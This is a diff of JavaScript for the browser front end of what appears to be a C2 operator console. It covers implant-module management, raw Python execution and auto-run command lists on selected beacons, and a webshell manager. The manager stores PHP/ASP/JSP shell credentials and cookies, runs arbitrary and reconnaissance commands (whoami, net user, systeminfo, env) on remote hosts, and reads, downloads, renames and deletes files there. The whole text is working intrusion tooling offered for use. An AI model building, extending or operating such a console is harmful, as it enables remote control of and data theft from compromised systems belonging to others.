+            (params ? '<span class="mod-params">' + escapeHtml(params) + '</span>' : '') + '</div>' +
+            '<div class="mod-desc">' + escapeHtml((m.desc || '').slice(0, 60)) + '</div></div>';
+    }).join('');
+}
+
+// ══════════ 模块详情 / 测试 模态框 ══════════
+let currentModule = null;   // {name, type: 'implant'|'server', filename?}
+
+function openModuleModal(name) {
+    fetch('/api/c2/module/' + encodeURIComponent(name))
+        .then(r => r.json())
+        .then(data => {
+            if (!data.ok) { alert(data.error || '加载失败'); return; }
+            const m = data.module;
+            currentModule = {name: m.name, type: 'implant'};
+            document.getElementById('mm-title').textContent = '植入模块 · ' + m.name + ' (' + m.type + ')';
+            document.getElementById('mm-desc').textContent = m.desc || '（无描述）';
+            document.getElementById('mm-params').innerHTML = m.type === 'python'
+                ? '<table class="table" style="font-size:0.8rem;"><thead><tr><th style="width:140px;">参数</th><th>说明</th></tr></thead><tbody>' +
+                  (m.params || []).map(p => '<tr><td class="mono">' + escapeHtml(p[0]) + '</td><td>' + escapeHtml(p[1] || '-') + '</td></tr>').join('') +
+                  '</tbody></table>' +
+                  (m.result_processor ? '<div class="help-text" style="margin:6px 0 0;">结果处理器: <code>' + escapeHtml(m.result_processor) + '</code></div>' : '')
+                : '<p class="help-text">JSON 序列模块，共 ' + (m.steps || []).length + ' 步</p>';
+            document.getElementById('mm-code-wrap').style.display = m.code ? '' : 'none';
+            document.getElementById('mm-code').textContent = m.code || '';
+            document.getElementById('mm-del-btn').style.display = '';
+            document.getElementById('mm-srun-btn').style.display = 'none';
+            document.getElementById('mm-output').style.display = 'none';
+            document.getElementById('module-modal').style.display = 'flex';
+        })
+        .catch(e => alert('加载失败: ' + e.message));
+}
+
+function openServerModuleModal(name) {
+    const m = serverMods.find(x => x.name === name);
+    if (!m) return;
+    currentModule = {name: m.name, type: 'server'};
+    document.getElementById('mm-title').textContent = 'Server 模块 · ' + m.name;
+    document.getElementById('mm-desc').textContent = m.desc || '（无描述）';
+    document.getElementById('mm-params').innerHTML = (m.params || []).length
+        ? '<table class="table" style="font-size:0.8rem;"><thead><tr><th style="width:140px;">参数</th><th>说明</th></tr></thead><tbody>' +
+          m.params.map(p => '<tr><td class="mono">' + escapeHtml(p[0]) + '</td><td>' + escapeHtml(p[1] || '-') + '</td></tr>').join('') + '</tbody></table>'
+        : '<p class="help-text">无参数</p>';
+    document.getElementById('mm-code-wrap').style.display = 'none';
+    document.getElementById('mm-del-btn').style.display = 'none';
+    document.getElementById('mm-srun-btn').style.display = '';
+    document.getElementById('mm-output').style.display = 'none';
+    document.getElementById('module-modal').style.display = 'flex';
+}
+
+function closeModuleModal() { document.getElementById('module-modal').style.display = 'none'; currentModule = null; }
+
+function mmArgs() { return (document.getElementById('mm-args').value || '').trim().split(/\s+/).filter(Boolean); }
+function mmPlatform() { return document.getElementById('mm-platform').value; }
+function showMmOutput(text) {
+    const el = document.getElementById('mm-output');
+    el.style.display = 'block';
+    el.textContent = text;
+}
+
+async function buildModulePreview() {
+    if (!currentModule) return;
+    const resp = await fetch('/api/c2/module/build', {method: 'POST', headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({name: currentModule.name, args: mmArgs(), platform: mmPlatform()})});
+    const data = await resp.json();
+    if (data.ok) showMmOutput('// 构建预览（dry-run，未下发）\n' + data.code);
+    else showMmOutput('[!] ' + (data.error || '构建失败'));
+}
+
+async function execModuleFromModal() {
+    if (!currentModule) return;
+    if (!currentBid) { alert('请先在左侧选中一个 beacon'); return; }
+    const resp = await fetch('/api/c2/module/exec', {method: 'POST', headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({client_id: currentBid, name: currentModule.name, args: mmArgs()})});
+    const data = await resp.json();
+    showMmOutput((data.ok ? '[+] ' : '[!] ') + (data.message || data.error || ''));
+    termAppend('pyexec> ' + currentModule.name + ' ' + mmArgs().join(' '), 'techo');
+    termAppend((data.ok ? '' : '[!] ') + (data.message || data.error || ''), '');
+    loadBeacons();
+}
+
+function runServerModule() {
+    if (!currentModule) return;
+    const argsStr = prompt('运行参数（空格分隔，可空）:', '') || '';
+    termCmd('s_exec ' + currentModule.name + (argsStr.trim() ? ' ' + argsStr.trim() : ''));
+    closeModuleModal();
+}
+
+async function deleteModuleFromModal() {
+    if (!currentModule || currentModule.type !== 'implant') return;
+    if (!confirm('确认删除植入模块 ' + currentModule.name + ' ？此操作会从 modules/ 删除文件并热生效。')) return;
+    const resp = await fetch('/api/c2/module/' + encodeURIComponent(currentModule.name), {method: 'DELETE'});
+    const data = await resp.json();
+    alert(data.message || (data.ok ? '已删除' : '删除失败'));
+    if (data.ok) { closeModuleModal(); loadModules(); loadModuleFiles(); }
+}
+
+// ══════════ 模块管理（添加/删除） ══════════
+async function addModuleFile() {
+    const filename = document.getElementById('mm-add-filename').value.trim();
+    const content = document.getElementById('mm-add-content').value;
+    const statusEl = document.getElementById('mm-add-status');
+    if (!filename || !content) { statusEl.textContent = '文件名和内容不能为空'; statusEl.style.color = 'var(--danger)'; return; }
+    statusEl.textContent = '提交中...'; statusEl.style.color = 'var(--text-muted)';
+    const resp = await fetch('/api/c2/module/add', {method: 'POST', headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({filename: filename, content: content})});
+    const data = await resp.json();
+    statusEl.textContent = (data.ok ? '✓ ' : '✗ ') + (data.message || data.error || '');
+    statusEl.style.color = data.ok ? 'var(--success)' : 'var(--danger)';
+    if (data.ok) { document.getElementById('mm-add-filename').value = ''; document.getElementById('mm-add-content').value = ''; loadModules(); loadModuleFiles(); }
+}
+
+async function loadModuleFiles() {
+    try {
+        const resp = await fetch('/api/c2/module-files');
+        const data = await resp.json();
+        if (!data.ok) return;
+        const box = document.getElementById('module-manage-list');
+        if (!data.files || !data.files.length) { box.innerHTML = '<span class="empty">无模块文件</span>'; return; }
+        box.innerHTML = data.files.map(f =>
+            '<div class="mgr-file"><span class="mod-name">' + escapeHtml(f.filename) + '</span>' +
+            '<span class="mono" style="color:var(--text-faint);font-size:0.7rem;">' + escapeHtml(f.name) + '</span>' +
+            '<span style="flex:1;"></span>' +
+            '<button class="btn btn-sm btn-danger" onclick="deleteModuleFile(\'' + escapeHtml(f.filename) + '\')">删除</button></div>').join('');
+    } catch (e) {}
+}
+
+async function deleteModuleFile(filename) {
+    if (!confirm('确认删除模块文件 ' + filename + ' ？')) return;
+    const resp = await fetch('/api/c2/module/' + encodeURIComponent(filename), {method: 'DELETE'});
+    const data = await resp.json();
+    alert(data.message || (data.ok ? '已删除' : '删除失败'));
+    if (data.ok) { loadModuleFiles(); loadModules(); }
+}
+
+// ══════════ 自动执行列表(条目化:添加/删除/拖动排序,自动保存) ══════════
+let autoCmds = [];
+
+async function loadAutoCommands() {
+    try {
+        const resp = await fetch('/api/c2/auto-commands');
+        const data = await resp.json();
+        if (data.ok) {
+            autoCmds = (data.auto_commands || []).map(function(s) { return String(s).trim(); }).filter(Boolean);
+            renderAutoCmds();
+        }
+    } catch (e) {}
+}
+
+function renderAutoCmds() {
+    const listEl = document.getElementById('auto-cmds-list');
+    if (!listEl) return;
+    if (!autoCmds.length) {
+        listEl.innerHTML = '<div class="auto-empty">暂无自动执行命令,在上方输入后点「添加」</div>';
+        setAutoStatus('共 0 条');
+        return;
+    }
+    listEl.innerHTML = autoCmds.map(function(cmd, i) {
+        return '<div class="auto-item" draggable="true" data-idx="' + i + '">' +
+            '<span class="auto-handle" title="拖动调整执行顺序">⋮⋮</span>' +
+            '<span class="auto-text">' + escapeHtml(cmd) + '</span>' +
+            '<button class="btn btn-sm btn-danger auto-del" onclick="delAutoCmd(' + i + ')" title="删除该自动执行命令">×</button>' +
+            '</div>';
+    }).join('');
+    setAutoStatus('共 ' + autoCmds.length + ' 条 · 从上到下顺序执行');
+}
+
+function setAutoStatus(msg, ok) {
+    const el = document.getElementById('auto-cmds-status');
+    if (!el) return;
+    el.textContent = msg;
+    el.style.color = ok === undefined ? 'var(--text-muted)' : (ok ? 'var(--success)' : 'var(--danger)');
+}
+
+function addAutoCmd() {
+    const input = document.getElementById('auto-cmd-input');
+    const cmd = (input.value || '').trim();
+    if (!cmd) { setAutoStatus('命令不能为空', false); return; }
+    autoCmds.push(cmd);
+    input.value = '';
+    renderAutoCmds();
+    saveAutoCommands();
+}
+
+function delAutoCmd(idx) {
+    if (idx < 0 || idx >= autoCmds.length) return;
+    autoCmds.splice(idx, 1);
+    renderAutoCmds();
+    saveAutoCommands();
+}
+
+// ── 拖动排序(原生 HTML5 DnD) ──
+let autoDragIdx = null;
+
+function autoInsertIndex(items, y) {
+    for (let i = 0; i < items.length; i++) {
+        const r = items[i].getBoundingClientRect();
+        if (y < r.top + r.height / 2) return i;
+    }
+    return items.length;
+}
+
+function initAutoDnD() {
+    const listEl = document.getElementById('auto-cmds-list');
+    if (!listEl) return;
+    listEl.addEventListener('dragstart', function(e) {
+        const item = e.target.closest('.auto-item');
+        if (!item) return;
+        autoDragIdx = parseInt(item.dataset.idx, 10);
+        item.classList.add('dragging');
+        e.dataTransfer.effectAllowed = 'move';
+        try { e.dataTransfer.setData('text/plain', String(autoDragIdx)); } catch (err) {}
+    });
+    listEl.addEventListener('dragend', function(e) {
+        const item = e.target.closest('.auto-item');
+        if (item) item.classList.remove('dragging');
+        listEl.querySelectorAll('.auto-item').forEach(function(el) { el.classList.remove('drag-before'); });
+        autoDragIdx = null;
+    });
+    listEl.addEventListener('dragover', function(e) {
+        e.preventDefault();
+        const items = listEl.querySelectorAll('.auto-item');
+        const idx = autoInsertIndex(items, e.clientY);
+        items.forEach(function(el, i) { el.classList.toggle('drag-before', i === idx); });
+    });
+    listEl.addEventListener('drop', function(e) {
+        e.preventDefault();
+        if (autoDragIdx === null) return;
+        const items = listEl.querySelectorAll('.auto-item');
+        let target = autoInsertIndex(items, e.clientY);
+        if (autoDragIdx < target) target -= 1;  // 移除源后目标索引前移
+        const moved = autoCmds.splice(autoDragIdx, 1)[0];
+        autoCmds.splice(target, 0, moved);
+        autoDragIdx = null;
+        renderAutoCmds();
+        saveAutoCommands();
+    });
+}
+initAutoDnD();
+
+async function saveAutoCommands() {
+    const statusEl = document.getElementById('auto-cmds-status');
+    if (statusEl) { statusEl.textContent = '保存中...'; statusEl.style.color = 'var(--text-muted)'; }
+    try {
+        const resp = await fetch('/api/c2/auto-commands', {method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({commands: autoCmds})});
+        const data = await resp.json();
+        setAutoStatus((data.ok ? '✓ ' : '✗ ') + (data.message || data.error || ''), data.ok);
+    } catch (err) {
+        setAutoStatus('✗ 保存失败: ' + err, false);
+    }
+}
+
+// ══════════ Python 代码编辑器 ══════════
+const pyCode = document.getElementById('py-code');
+pyCode.addEventListener('keydown', function(e) {
+    if (e.key === 'Tab') {
+        e.preventDefault();
+        const s = pyCode.selectionStart, t = pyCode.selectionEnd;
+        pyCode.setRangeText('    ', s, t, 'end');
+    } else if (e.key === 'Enter' && e.ctrlKey) {
+        e.preventDefault();
+        sendRawCode();
+    }
+});
+
+function getSnippets() { try { return JSON.parse(localStorage.getItem('fs3_c2_snippets') || '[]'); } catch (e) { return []; } }
+function setSnippets(list) { localStorage.setItem('fs3_c2_snippets', JSON.stringify(list)); renderSnippets(); }
+
+function renderSnippets() {
+    const sel = document.getElementById('py-snippets');
+    const list = getSnippets();
+    sel.innerHTML = '<option value="">— 片段库 —</option>' +
+        list.map((s, i) => '<option value="' + i + '">' + escapeHtml(s.name) + '</option>').join('');
+}
+
+function saveSnippet() {
+    const code = pyCode.value.trim();
+    if (!code) { alert('代码为空'); return; }
+    const name = prompt('片段名称:', 'snippet-' + new Date().toISOString().slice(11, 19)) || '';
+    if (!name) return;
+    const list = getSnippets();
+    list.push({name: name, code: code});
+    setSnippets(list);
+    alert('已保存片段: ' + name);
+}
+
+function loadSnippet() {
+    const sel = document.getElementById('py-snippets');
+    if (!sel.value) return;
+    pyCode.value = getSnippets()[parseInt(sel.value, 10)].code;
+}
+
+function delSnippet() {
+    const sel = document.getElementById('py-snippets');
+    if (!sel.value) return;
+    const list = getSnippets();
+    const name = list[parseInt(sel.value, 10)].name;
+    if (!confirm('删除片段 ' + name + ' ？')) return;
+    list.splice(parseInt(sel.value, 10), 1);
+    setSnippets(list);
+}
+
+function clearEditor() { pyCode.value = ''; }
+
+async function sendRawCode() {
+    const code = pyCode.value.trim();
+    if (!code) { alert('代码为空'); return; }
+    if (!currentBid) { alert('请先在左侧选中一个 beacon'); return; }
+    termAppend('pyexec> raw (Python 代码, ' + code.split('\n').length + ' 行)', 'techo');
+    const resp = await fetch('/api/c2/raw', {method: 'POST', headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({client_id: currentBid, code: code})});
+    const data = await resp.json();
+    termAppend((data.ok ? '' : '[!] ') + (data.message || data.error || ''), '');
+    loadBeacons();
+}
+
+// ══════════ WebShell 管理 ══════════
+let currentWsId = '';
+let allWsConns = [];
+let wsCmdHistory = [];
+let wsHistIdx = -1;
+let wsOutputHistory = [];
+let wsCwd = '.';          // 文件浏览器当前目录(默认 '.' 由后端展开)
+let wsOs = 'auto';        // 当前连接 OS(影响文件浏览器分隔符/解析)
+const WS_QUICK_CMDS = ['whoami', 'uname -a', 'id', 'pwd', 'ls -la', 'ipconfig', 'net user', 'systeminfo', 'ps aux', 'env'];
+
+// ── 子 tab 切换 ──
+function wsSwitchSub(sub) {
+    document.querySelectorAll('.ws-sub-tab').forEach(function(b) { b.classList.toggle('active', b.getAttribute('data-ws-sub') === sub); });
+    document.getElementById('ws-sub-term').style.display = (sub === 'term') ? '' : 'none';
+    document.getElementById('ws-sub-file').style.display = (sub === 'file') ? '' : 'none';
+    document.getElementById('ws-sub-hist').style.display = (sub === 'hist') ? '' : 'none';
+    if (sub === 'file' && currentWsId) wsFileRefresh();
+    if (sub === 'hist' && currentWsId) loadWsHistory();
+}
+
+// ── 连接列表 ──
+async function loadWsConnections() {
+    try {
+        const resp = await fetch('/api/webshell/connections');
+        const data = await resp.json();
+        allWsConns = data.connections || [];
+        document.getElementById('ws-count').textContent = allWsConns.length ? '(' + allWsConns.length + ')' : '';
+        renderWsList();
+    } catch (e) {}
+}
+
+function wsTypeBadge(t) {
+    const colors = {php: 'var(--success)', asp: 'var(--warning)', aspx: 'var(--accent)', jsp: 'var(--danger)'};
+    const c = colors[t] || 'var(--text-muted)';
+    return '<span class="badge" style="color:' + c + ';border-color:' + c + ';">' + escapeHtml(t) + '</span>';
+}
+
+function renderWsList() {
+    const list = document.getElementById('ws-list');
+    const q = (document.getElementById('ws-search').value || '').trim().toLowerCase();
+    const shown = q ? allWsConns.filter(function(c) {
+        return ((c.url || '') + ' ' + (c.remark || '') + ' ' + (c.type || '') + ' ' + (c.id || '')).toLowerCase().includes(q);
+    }) : allWsConns;
+    if (!shown.length) {
+        list.innerHTML = '<div class="empty-state" style="padding:24px 12px;">' +
+            (allWsConns.length ? '无匹配连接' : '暂无连接，点「新建连接」添加') + '</div>';
+        return;
+    }
+    let html = '';
+    for (const c of shown) {
+        const osTxt = c.os && c.os !== 'auto' ? ' · ' + escapeHtml(c.os) : '';
+        html += '<div class="list-item ' + (c.id === currentWsId ? 'selected' : '') + '" onclick="selectWsConn(\'' + c.id + '\')" style="cursor:pointer;">' +
+                '<div class="li-title" style="display:flex;align-items:center;gap:6px;">' +
+                wsTypeBadge(c.type) + '<span style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">' + escapeHtml(c.url || c.id) + '</span></div>' +
+                '<div class="li-meta">' +
+                '<span>' + escapeHtml(c.method) + osTxt + '</span>' +
+                (c.remark ? ' · ' + escapeHtml(c.remark) : '') +
+                '<span style="float:right;color:var(--danger);cursor:pointer;" onclick="event.stopPropagation();delWsConn(\'' + c.id + '\')" title="删除连接">✕ 删</span>' +
+                '</div></div>';
+    }
+    list.innerHTML = html;
+}
+
+// ── 模态表单(新建/编辑) ──
+function openWsForm(conn) {
+    document.getElementById('ws-modal-mask').style.display = 'flex';
+    document.getElementById('ws-form-title').textContent = conn ? '编辑连接' : '新建连接';
+    document.getElementById('wsf-id').value = conn ? conn.id : '';
+    document.getElementById('wsf-url').value = conn ? (conn.url || '') : '';
+    document.getElementById('wsf-password').value = '';
+    document.getElementById('wsf-password').placeholder = conn && conn.password ? '**** = 保持不变' : '可选';
+    document.getElementById('wsf-type').value = conn ? (conn.type || 'php') : 'php';
+    document.getElementById('wsf-method').value = conn ? (conn.method || 'post') : 'post';
+    document.getElementById('wsf-cmdparam').value = conn ? (conn.cmd_param || 'cmd') : 'cmd';
+    document.getElementById('wsf-encoding').value = conn ? (conn.encoding || 'auto') : 'auto';
+    document.getElementById('wsf-os').value = conn ? (conn.os || 'auto') : 'auto';
+    document.getElementById('wsf-remark').value = conn ? (conn.remark || '') : '';
+    document.getElementById('wsf-cookie').value = conn ? (conn.cookie || '') : '';
+    setTimeout(function() { document.getElementById('wsf-url').focus(); }, 30);
+}
+function closeWsForm() { document.getElementById('ws-modal-mask').style.display = 'none'; }
+
+async function wsFormSave() {
+    const id = document.getElementById('wsf-id').value;
+    const url = document.getElementById('wsf-url').value.trim();
+    if (!url) { alert('URL 必填'); return; }
+    const body = {
+        url: url,
+        password: document.getElementById('wsf-password').value.trim(),
+        type: document.getElementById('wsf-type').value,
+        method: document.getElementById('wsf-method').value,
+        cmd_param: document.getElementById('wsf-cmdparam').value.trim() || 'cmd',
+        encoding: document.getElementById('wsf-encoding').value,
+        os: document.getElementById('wsf-os').value,
+        remark: document.getElementById('wsf-remark').value.trim(),
+        cookie: document.getElementById('wsf-cookie').value.trim(),
+    };
+    try {
+        if (id) {
+            const r = await fetch('/api/webshell/connection/' + id, {method: 'PUT', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(body)});
+            const d = await r.json();
+            if (!d.ok) { alert(d.error || '保存失败'); return; }
+        } else {
+            const r = await fetch('/api/webshell/connections', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(body)});
+            const d = await r.json();
+            if (!d.ok) { alert(d.error || '创建失败'); return; }
+            currentWsId = d.connection.id;
+        }
+        closeWsForm();
+        await loadWsConnections();
+        if (currentWsId) selectWsConn(currentWsId);
+    } catch (e) { alert('请求失败: ' + e.message); }
+}
+
+// ── 导出/导入 ──
+function wsExport() {
+    if (!allWsConns.length) { alert('无连接可导出'); return; }
+    const blob = new Blob([JSON.stringify(allWsConns, null, 2)], {type: 'application/json'});
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = 'webshell-conns-' + new Date().toISOString().slice(0, 10) + '.json';
+    a.click();
+    URL.revokeObjectURL(a.href);
+}
+
+function wsImport() {
+    const input = document.createElement('input');
+    input.type = 'file';
+    input.accept = '.json,application/json';
+    input.onchange = async function() {
+        const f = input.files[0];
+        if (!f) return;
+        try {
+            const arr = JSON.parse(await f.text());
+            const list = Array.isArray(arr) ? arr : [arr];
+            let ok = 0, fail = 0;
+            for (const c of list) {
+                if (!c || !c.url) { fail++; continue; }
+                const r = await fetch('/api/webshell/connections', {method: 'POST', headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({url: c.url, password: c.password || '', type: c.type || 'php', method: c.method || 'post',
+                        cmd_param: c.cmd_param || 'cmd', encoding: c.encoding || 'auto', os: c.os || 'auto',
+                        remark: c.remark || '', cookie: c.cookie || ''})});
+                const d = await r.json();
+                if (d.ok) ok++; else fail++;
+            }
+            alert('导入完成: 成功 ' + ok + ' 条' + (fail ? ', 失败 ' + fail + ' 条' : ''));
+            loadWsConnections();
+        } catch (e) { alert('导入失败: ' + e.message); }
+    };
+    input.click();
+}
+
+// ── 详情 / 编辑 / 删除 ──
+async function selectWsConn(id) {
+    currentWsId = id;
+    document.getElementById('ws-title').textContent = '连接 ' + id.slice(-6);
+    renderWsList();
+    const resp = await fetch('/api/webshell/connection/' + id);
+    const data = await resp.json();
+    if (!data.ok) { document.getElementById('ws-detail').innerHTML = '<div class="flash error">' + escapeHtml(data.error) + '</div>'; return; }
+    const c = data.connection;
+    wsOs = c.os || 'auto';
+    wsCwd = '.';
+    let html = '<table class="table" style="font-size:0.82rem;"><tbody>';
+    html += '<tr><td style="width:110px;color:var(--text-muted);">URL</td><td class="value-cell mono">' + escapeHtml(c.url) + '</td></tr>';
+    html += '<tr><td style="color:var(--text-muted);">密码</td><td class="mono"><span id="ws-pass-view">' + escapeHtml(c.password ? '****' : '(空)') + '</span> ' +
+            (c.password ? '<button class="btn btn-xs" onclick="wsTogglePass()" id="ws-pass-btn">显示</button>' : '') + '</td></tr>';
+    html += '<tr><td style="color:var(--text-muted);">类型/方法</td><td class="mono">' + wsTypeBadge(c.type) + ' / ' + escapeHtml(c.method) + '</td></tr>';
+    html += '<tr><td style="color:var(--text-muted);">参数名</td><td class="mono">' + escapeHtml(c.cmd_param) + '</td></tr>';
+    html += '<tr><td style="color:var(--text-muted);">编码/OS</td><td class="mono">' + escapeHtml(c.encoding || 'auto') + ' / ' + escapeHtml(c.os || 'auto') + '</td></tr>';
+    html += '<tr><td style="color:var(--text-muted);">Cookie</td><td class="mono">' + escapeHtml(c.cookie ? c.cookie.slice(0, 40) + (c.cookie.length > 40 ? '…' : '') : '-') + '</td></tr>';
+    html += '<tr><td style="color:var(--text-muted);">备注</td><td>' + escapeHtml(c.remark || '-') + '</td></tr>';
+    html += '</tbody></table>';
+    html += '<div class="form-row" style="margin-top:8px;gap:6px;">' +
+            '<button class="btn btn-sm" onclick="testWsConn()" title="发 whoami 探测连通性">测试</button>' +
+            '<button class="btn btn-sm" onclick="editWsConn()">编辑</button>' +
+            '<button class="btn btn-sm btn-danger" onclick="delWsConn(\'' + id + '\')">删除</button>' +
+            '</div>';
+    document.getElementById('ws-detail').innerHTML = html;
+    loadWsHistory();
+}
+
+let wsPassVisible = false;
+let wsPassCache = '';
+async function wsTogglePass() {
+    // 明文密码只在点击"显示"时经专用接口拉取(详情接口始终打码)
+    if (!wsPassCache) {
+        const r = await fetch('/api/webshell/connection/' + currentWsId + '/password');
+        const d = await r.json();
+        wsPassCache = d.ok ? (d.password || '') : '';
+    }
+    wsPassVisible = !wsPassVisible;
+    document.getElementById('ws-pass-view').textContent = wsPassVisible ? (wsPassCache || '(空)') : '****';
+    document.getElementById('ws-pass-btn').textContent = wsPassVisible ? '隐藏' : '显示';
+}
+
+async function editWsConn() {
+    const r = await fetch('/api/webshell/connection/' + currentWsId);
+    const d = await r.json();
+    if (!d.ok) { alert(d.error || '加载失败'); return; }
+    openWsForm(d.connection);
+}
+
+async function delWsConn(id) {
+    if (!confirm('确认删除该连接？')) return;
+    await fetch('/api/webshell/connection/' + id, {method: 'DELETE'});
+    if (id === currentWsId) {
+        currentWsId = '';
+        document.getElementById('ws-title').textContent = '连接详情';
+        document.getElementById('ws-detail').innerHTML = '';
+        document.getElementById('ws-output').textContent = '';
+        wsOutputHistory = [];
+        wsCwd = '.';
+    }
+    loadWsConnections();
+}
+
+async function testWsConn() {
+    if (!currentWsId) return;
+    const el = document.getElementById('ws-output');
+    const t0 = Date.now();
+    const resp = await fetch('/api/webshell/exec', {method: 'POST', headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({conn_id: currentWsId, command: 'whoami', timeout: 15})});
+    const data = await resp.json();
+    const ms = Date.now() - t0;
+    wsAppendOutput('[' + new Date().toLocaleTimeString() + '] 测试 whoami · ' + ms + 'ms ' + (data.exec_ok ? '✓ 连通' : '✗ 失败') + (data.error ? ' · ' + data.error : ''));
+    wsAppendOutput((data.output || '(无输出)'));
+    wsSwitchSub('term');
+}
+
+// ── 命令历史(↑↓) + 输出 ──
+function wsCmdKeydown(e) {
+    if (e.isComposing) return;
+    if (e.key === 'Enter') { e.preventDefault(); wsExec(); return; }
+    if (e.key === 'ArrowUp') {
+        e.preventDefault();
+        if (!wsCmdHistory.length) return;
+        wsHistIdx = wsHistIdx < 0 ? wsCmdHistory.length - 1 : Math.max(0, wsHistIdx - 1);
+        document.getElementById('ws-cmd').value = wsCmdHistory[wsHistIdx];
+    } else if (e.key === 'ArrowDown') {
+        e.preventDefault();
+        if (wsHistIdx < 0) return;
+        wsHistIdx++;
+        if (wsHistIdx >= wsCmdHistory.length) { wsHistIdx = -1; document.getElementById('ws-cmd').value = ''; }
+        else { document.getElementById('ws-cmd').value = wsCmdHistory[wsHistIdx]; }
+    } else if (e.key === 'Tab') {
+        e.preventDefault();
+        const input = document.getElementById('ws-cmd');
+        const val = input.value;
+        const match = WS_QUICK_CMDS.find(function(c) { return c.startsWith(val); });
+        if (match && val) input.value = match + ' ';
+    }
+}
+
+function wsQuick(cmd) {
+    document.getElementById('ws-cmd').value = cmd;
+    wsExec();
+}
+
+function wsAppendOutput(text, cls) {
+    wsOutputHistory.push({text: text, cls: cls || ''});
+    if (wsOutputHistory.length > 100) wsOutputHistory.shift();
+    renderWsOutput();
+    document.getElementById('ws-hist-info').textContent = '执行历史: ' + wsOutputHistory.length;
+}
+
+function renderWsOutput() {
+    const el = document.getElementById('ws-output');
+    let html = '';
+    for (const h of wsOutputHistory) {
+        const kls = h.cls || (h.text.startsWith('[!]') ? 'terr' : h.text.startsWith('[+]') ? 'tok' : 'tplain');
+        html += '<div class="term-line ' + kls + '"><span class="term-line-body">' + escapeHtml(h.text) + '</span></div>';
+    }
+    el.innerHTML = html;
+    el.scrollTop = el.scrollHeight;
+}
+
+function copyWsOutput() {
+    const text = wsOutputHistory.map(function(h) { return h.text; }).join('\n');
+    navigator.clipboard.writeText(text).then(function() { alert('已复制 ' + wsOutputHistory.length + ' 行'); })
+        .catch(function() { alert('复制失败'); });
+}
+
+function clearWsHistory() {
+    wsOutputHistory = [];
+    document.getElementById('ws-output').textContent = '';
+    document.getElementById('ws-hist-info').textContent = '执行历史: 0';
+}
+
+function wsTimeout() {
+    const v = parseInt(document.getElementById('ws-timeout').value, 10);
+    return (v >= 1 && v <= 300) ? v : 30;
+}
+
+async function wsExec() {
+    const command = document.getElementById('ws-cmd').value.trim();
+    if (!currentWsId) { alert('请先选择或新建连接'); return; }
+    if (!command) { alert('命令为空'); return; }
+    wsCmdHistory = wsCmdHistory.filter(function(c) { return c !== command; });
+    wsCmdHistory.push(command);
+    if (wsCmdHistory.length > 20) wsCmdHistory.shift();
+    wsHistIdx = -1;
+    document.getElementById('ws-cmd').value = '';
+    const t0 = Date.now();
+    const resp = await fetch('/api/webshell/exec', {method: 'POST', headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({conn_id: currentWsId, command: command, timeout: wsTimeout()})});
+    const data = await resp.json();
+    const ms = Date.now() - t0;
+    wsAppendOutput('[' + new Date().toLocaleTimeString() + '] $ ' + command + '  (' + ms + 'ms)' + (data.exec_ok ? '' : ' [!] ' + (data.error || '执行失败')), data.exec_ok ? '' : 'terr');
+    wsAppendOutput((data.output || '(无输出)'));
+    loadWsHistory();
+}
+
+// ── 文件管理 ──
+function wsJoinPath(dir, name) {
+    if (wsOs === 'windows') {
+        const base = dir.replace(/\//g, '\\');
+        return base === '.' ? name : (base.endsWith('\\') ? base + name : base + '\\' + name);
+    }
+    return dir === '.' || dir === '/' ? '/' + name : dir.replace(/\/$/, '') + '/' + name;
+}
+
+function wsDirname(p) {
+    const sep = wsOs === 'windows' ? '\\' : '/';
+    const idx = p.lastIndexOf(sep);
+    if (idx <= 0) return sep === '/' ? '/' : (p.slice(0, 2) || '.');
+    return p.slice(0, idx);
+}
+
+function wsFileRefresh() { wsFileList(wsCwd); }
+
+async function wsFileList(path) {
+    if (!currentWsId) return;
+    wsCwd = path || '.';
+    const box = document.getElementById('ws-filelist');
+    box.innerHTML = '<div class="empty-state" style="padding:18px;">加载中…</div>';
+    document.getElementById('ws-cwd').textContent = wsCwd;
+    const resp = await fetch('/api/webshell/fileop', {method: 'POST', headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({conn_id: currentWsId, action: 'list', path: path || '.', timeout: wsTimeout()})});
+    const data = await resp.json();
+    if (!data.exec_ok) {
+        box.innerHTML = '<div class="flash error">' + escapeHtml(data.error || '列目录失败') + '</div>' +
+                        '<pre class="code-block" style="max-height:300px;">' + escapeHtml(data.output || '') + '</pre>';
+        return;
+    }
+    const entries = wsParseList(data.output || '');
+    if (!entries.length) {
+        box.innerHTML = '<div class="empty-state" style="padding:18px;">目录为空或无法解析</div>' +
+                        '<pre class="code-block" style="max-height:200px;">' + escapeHtml(data.output) + '</pre>';
+        return;
+    }
+    let html = '<table class="table ws-file-table" style="font-size:0.78rem;"><thead><tr><th style="width:26px;"></th><th>名称</th><th style="width:90px;">大小</th><th style="width:150px;">修改时间</th><th style="width:190px;">操作</th></tr></thead><tbody>';
+    html += '<tr><td>📁</td><td><a href="javascript:;" onclick="wsFileUp()" style="color:var(--accent);">..</a></td><td></td><td></td><td></td></tr>';
+    for (const e of entries) {
+        const icon = e.isDir ? '📁' : (e.isLink ? '🔗' : '📄');
+        const name = escapeHtml(e.name);
+        const size = e.isDir ? '-' : (e.size != null ? e.size : '');
+        const op = e.isDir
+            ? '<button class="btn btn-xs" onclick="wsFileList(\'' + escapeHtml(e.fullPath) + '\')">进入</button>'
+            : '<button class="btn btn-xs" onclick="wsFileRead(\'' + escapeHtml(e.fullPath) + '\')">读</button>' +
+              '<button class="btn btn-xs" onclick="wsFileDownload(\'' + escapeHtml(e.fullPath) + '\', \'' + name + '\')">下载</button>' +
+              '<button class="btn btn-xs" onclick="wsFileRename(\'' + escapeHtml(e.fullPath) + '\')">改名</button>' +
+              '<button class="btn btn-xs btn-danger" onclick="wsFileDelete(\'' + escapeHtml(e.fullPath) + '\')">删</button>';
